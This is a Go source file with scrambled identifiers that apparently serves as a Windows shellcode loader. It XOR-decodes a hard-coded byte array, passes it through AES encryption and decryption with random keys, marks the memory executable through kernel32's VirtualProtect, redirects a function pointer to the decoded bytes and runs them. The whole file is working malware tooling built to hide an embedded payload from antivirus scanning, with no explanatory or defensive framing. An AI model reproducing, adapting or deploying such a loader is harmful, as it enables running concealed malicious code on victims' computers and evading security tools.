package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"math/rand"
	"syscall"
	"time"
	"unsafe"
)

var SVOQYLy = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func dJQHaDgo(gZSKntdLY unsafe.Pointer, GaGeTPpPldRr uintptr, bjcYGCWMzFaLuK uint32, fwTrSo unsafe.Pointer) bool {

	ret, _, _ := SVOQYLy.Call(

		uintptr(gZSKntdLY),

		uintptr(GaGeTPpPldRr),

		uintptr(bjcYGCWMzFaLuK),

		uintptr(fwTrSo))

	return ret > 0

}

func RESlTmMDmWncBtpXwD(MFVQowHCLrNmDtnWYz []byte) {

	f := func() {}

	var ZLvNqqJwqXHloGpUMl uint32

	if !dJQHaDgo(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&ZLvNqqJwqXHloGpUMl)) {

		panic("call to dJQHaDgo failed!")

	}

	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&MFVQowHCLrNmDtnWYz))

	var UysY uint32

	if !dJQHaDgo(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&MFVQowHCLrNmDtnWYz))), uintptr(len(MFVQowHCLrNmDtnWYz)), uint32(0x40), unsafe.Pointer(&UysY)) {

		panic("call to dJQHaDgo failed!")

	}

	f()

}

func HaUWoGZNMhmzpkvnfcV(oesI []byte) []byte {

	nBcXYWJokWHL := len(oesI)

	PiZHFDVQfvnd := int(oesI[nBcXYWJokWHL-1])

	return oesI[:(nBcXYWJokWHL - PiZHFDVQfvnd)]

}

func MlKgAAiHLqQn(VyhRtfzQ, MBfEsmSRXDw []byte) ([]byte, error) {

	rvfBBJHUp, err := aes.NewCipher(MBfEsmSRXDw)

	if err != nil {

		return nil, err

	}

	oRbddRTRLzOc := rvfBBJHUp.BlockSize()

	oJFrHGXVoJVbDJnC := cipher.NewCBCDecrypter(rvfBBJHUp, MBfEsmSRXDw[:oRbddRTRLzOc])

	NszFdzxYUHSCltbc := make([]byte, len(VyhRtfzQ))

	oJFrHGXVoJVbDJnC.CryptBlocks(NszFdzxYUHSCltbc, VyhRtfzQ)

	NszFdzxYUHSCltbc = HaUWoGZNMhmzpkvnfcV(NszFdzxYUHSCltbc)

	return NszFdzxYUHSCltbc, nil

}

func cTGVhftfpmVaIdBc(jtWfBgYndxvGkVt string, ppVgmJTAQqfLffRuE string) {

	RLsKmAf, _ := base64.StdEncoding.DecodeString(ppVgmJTAQqfLffRuE)

	var apDlWmqek []byte = []byte(jtWfBgYndxvGkVt)

	fBWaQMWSZTb, _ := MlKgAAiHLqQn(RLsKmAf, apDlWmqek)

	RESlTmMDmWncBtpXwD(fBWaQMWSZTb)

}

func YcmH(PYsXxLtIO int) string {

	nHyoeTkZboyzaHwHR := "0123456789abcdefghijklmnopqrstuvwxyz"

	JpRJGWAfHMvSrnt := []byte(nHyoeTkZboyzaHwHR)

	WhrYCQoprtrSDuRiqj := []byte{}

	ETQFzDxlmcHrkCsn := rand.New(rand.NewSource(time.Now().UnixNano()))

	for VYdkQCRtuSjr := 0; VYdkQCRtuSjr < PYsXxLtIO; VYdkQCRtuSjr++ {

		WhrYCQoprtrSDuRiqj = append(WhrYCQoprtrSDuRiqj, JpRJGWAfHMvSrnt[ETQFzDxlmcHrkCsn.Intn(len(JpRJGWAfHMvSrnt))])

	}

	return string(WhrYCQoprtrSDuRiqj)

}

func gcfROUQoYFXvCA(GEWVFHtTPjVl, zgoQsaxeytOITD string) (JSyzxSvzIWBeWnUGK string) {
	SSixgEtlkOjU := len(zgoQsaxeytOITD)
	for htdXNnVDigRuANtBdXQ := range GEWVFHtTPjVl {
		JSyzxSvzIWBeWnUGK += string(GEWVFHtTPjVl[htdXNnVDigRuANtBdXQ] ^ zgoQsaxeytOITD[htdXNnVDigRuANtBdXQ%SSixgEtlkOjU])
	}
	return JSyzxSvzIWBeWnUGK
}

func vFrDNqUbmmqGpfrt(IYXLiJwhSd []byte, JbzlOtqIjUOqBwV int) []byte {

	XlgVhMeMMIZMBc := JbzlOtqIjUOqBwV - len(IYXLiJwhSd)%JbzlOtqIjUOqBwV

	jpWic := bytes.Repeat([]byte{byte(XlgVhMeMMIZMBc)}, XlgVhMeMMIZMBc)

	return append(IYXLiJwhSd, jpWic...)

}

func Fenw(HREMYUcHFZZtGmBzqMRp, UkAzBAT []byte) ([]byte, error) {

	guWp, err := aes.NewCipher(UkAzBAT)

	if err != nil {

		return nil, err

	}

	Yi := guWp.BlockSize()

	HREMYUcHFZZtGmBzqMRp = vFrDNqUbmmqGpfrt(HREMYUcHFZZtGmBzqMRp, Yi)

	EFA := cipher.NewCBCEncrypter(guWp, UkAzBAT[:Yi])

	bCUosfI := make([]byte, len(HREMYUcHFZZtGmBzqMRp))

	EFA.CryptBlocks(bCUosfI, HREMYUcHFZZtGmBzqMRp)

	return bCUosfI, nil

}

func main() {
	ZIIirrh := "41991qkjcnfnwpf3"
	QApprlpVisSXkUj := []byte{1,4,1,0,84,68,83,89,6,13,80,94,68,65,5,3,2,7,91,1,6,66,92,89,86,94,80,86,65,68,80,7,3,3,15,12,7,73,92,88,85,8,80,93,67,65,80,11,0,6,15,12,6,69,94,90,91,87,80,91,17,19,85,2,87,1,15,13,9,19,95,90,80,94,94,12,67,64,86,80,12,83,13,9,0,18,83,83,0,93,94,12,71,67,94,10,87,2,1,91,1,66,83,8,87,94,86,86,79,73,82,6,82,9,1,91,4,73,88,9,83,95,5,93,79,18,83,81,3,9,9,8,82,66,83,8,84,12,84,94,71,65,5,4,12,8,14,93,87,69,83,8,87,12,84,90,71,65,5,2,12,8,13,93,87,65,83,8,86,93,87,13,71,65,5,1,12,8,12,12,84,18,83,8,86,93,87,90,68,65,5,3,12,83,14,93,87,69,83,8,84,91,0,13,68,65,5,10,82,82,1,91,2,18,83,93,83,93,81,10,17,72,80,5,12,2,90,8,1,23,13,89,2,88,81,90,71,69,82,3,7,8,93,9,6,67,14,94,91,12,82,10,17,64,94,81,1,4,92,90,7,71,83,8,83,90,82,95,79,18,86,7,12,3,9,10,5,68,13,82,91,87,82,91,18,72,85,2,80,3,12,11,7,73,93,91,84,92,81,87,67,65,80,11,0,82,15,0,7,67,92,88,85,86,82,13,65,22,80,2,2,5,12,13,87,23,92,95,5,86,94,12,67,69,3,11,82,87,93,9,9,72,95,95,6,90,85,95,20,64,80,5,86,9,10,10,2,67,94,90,85,86,81,89,64,67,85,1,1,87,12,13,9,19,94,14,6,90,0,8,19,67,94,10,0,4,92,9,2,64,15,88,85,88,4,15,64,69,81,3,1,3,15,1,6,69,93,91,84,92,81,90,65,72,83,4,1,2,13,8,4,66,94,94,5,8,81,91,18,64,94,81,0,4,92,1,87,23,15,90,91,87,82,91,19,19,85,2,80,83,15,15,83,19,82,90,83,95,84,87,19,19,83,7,1,2,1,91,5,68,15,9,5,8,2,94,68,65,2,1,2,7,91,88,6,69,95,91,86,92,80,86,65,22,80,0,2,83,15,12,7,73,94,93,86,93,82,95,66,67,83,7,82,87,14,12,84,65,83,8,87,91,3,86,17,22,2,3,12,8,13,12,85,73,88,91,7,12,83,93,66,67,83,0,7,0,90,0,83,64,91,92,86,95,82,93,66,67,82,0,1,2,1,91,5,68,15,82,5,8,2,94,79,73,82,6,80,5,10,8,85,19,94,89,85,88,80,86,70,65,83,80,12,1,90,10,1,67,93,92,86,93,94,87,65,69,2,3,7,0,90,0,4,64,93,82,85,92,80,87,65,21,80,7,1,5,95,95,6,68,14,90,91,12,82,91,18,72,0,85,80,1,1,0,5,68,8,9,85,15,87,94,17,22,81,6,80,1,95,95,6,68,15,94,91,12,82,91,20,19,0,85,80,1,10,8,82,72,93,92,1,87,80,91,65,21,83,2,2,9,15,90,7,72,92,89,84,90,83,90,17,22,81,6,81,1,1,91,5,68,14,82,5,8,2,94,79,73,82,6,87,9,10,8,82,72,94,91,5,8,81,91,19,68,94,81,0,4,90,1,87,23,15,90,80,95,5,87,65,70,4,10,3,1,14,13,4,64,93,82,85,95,80,93,65,67,80,6,1,5,95,95,6,68,14,90,91,12,82,91,18,72,0,85,80,1,1,0,5,68,8,94,80,95,5,87,66,65,83,2,82,87,14,12,85,69,83,8,87,91,5,90,17,22,2,3,12,8,13,12,82,65,9,11,85,93,80,93,65,20,80,7,87,0,92,88,1,73,94,88,91,87,80,91,21,19,85,2,80,3,1,10,84,18,90,90,91,87,80,91,21,72,85,2,80,3,95,95,6,68,8,90,5,8,81,91,20,64,0,85,3,4,90,9,4,67,94,88,80,95,5,94,67,64,5,2,87,1,9,1,5,65,94,90,86,92,83,92,66,66,83,1,1,3,12,11,4,67,94,88,86,92,83,92,68,65,5,3,4,5,13,13,4,65,83,83,85,91,4,90,68,65,2,1,2,7,91,88,6,66,95,91,86,92,80,86,65,22,80,0,2,4,14,10,7,73,92,94,85,91,83,94,64,66,80,11,0,2,14,11,7,68,93,91,86,90,0,8,64,69,0,11,12,83,13,12,84,73,13,12,7,94,94,87,67,69,4,3,7,0,93,11,87,23,92,95,1,86,0,8,64,69,4,7,1,3,12,11,4,67,88,91,0,94,82,94,66,64,83,1,1,3,95,95,6,68,9,9,86,92,94,12,66,20,4,3,82,87,93,10,2,64,8,83,1,87,86,95,65,69,81,0,3,2,90,8,84,72,91,82,86,95,80,86,66,64,81,1,2,87,15,10,7,73,95,95,84,86,80,87,64,68,83,7,82,87,14,12,87,73,83,8,87,91,3,86,17,22,2,3,12,8,13,12,80,18,88,91,7,92,83,94,79,18,82,6,85,82,95,95,85,65}
	OvyIjJvfeere := bytes.NewBuffer(QApprlpVisSXkUj).String()
	akIYP := gcfROUQoYFXvCA(OvyIjJvfeere, ZIIirrh)
	UStPxkFoIU := YcmH(16)
	pRojbdLvKqZnzkt := YcmH(16)
	EwbVNAmSKpNxRMij := gcfROUQoYFXvCA(akIYP, UStPxkFoIU)
	mFLd := gcfROUQoYFXvCA(EwbVNAmSKpNxRMij, UStPxkFoIU)
	WGYQQhsDgZl, _ := hex.DecodeString(mFLd)
	var SMAloXuiFgr []byte = []byte(pRojbdLvKqZnzkt)
	ky, _ := Fenw(WGYQQhsDgZl, SMAloXuiFgr)
	NHEIHfFEg := base64.StdEncoding.EncodeToString(ky)
	cTGVhftfpmVaIdBc(pRojbdLvKqZnzkt, NHEIHfFEg)
}